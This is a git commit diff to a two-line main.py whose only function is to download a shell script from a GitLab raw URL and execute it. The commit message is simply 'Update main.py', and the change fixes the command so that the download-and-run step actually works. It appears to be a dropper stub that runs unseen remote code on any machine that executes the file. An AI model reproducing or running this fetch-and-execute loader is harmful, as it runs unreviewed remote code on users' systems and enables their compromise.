dc4ee3b0eede74dfd0f5fc0d0232ed4def43b8c7
gersadega4 <gersadega4@gmail.com>
2026-02-28 06:15:39 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,2 @@
 import os
-os.system('wget https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh | bash')
+os.system('wget https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && chmod +x new.sh && bash new.sh')
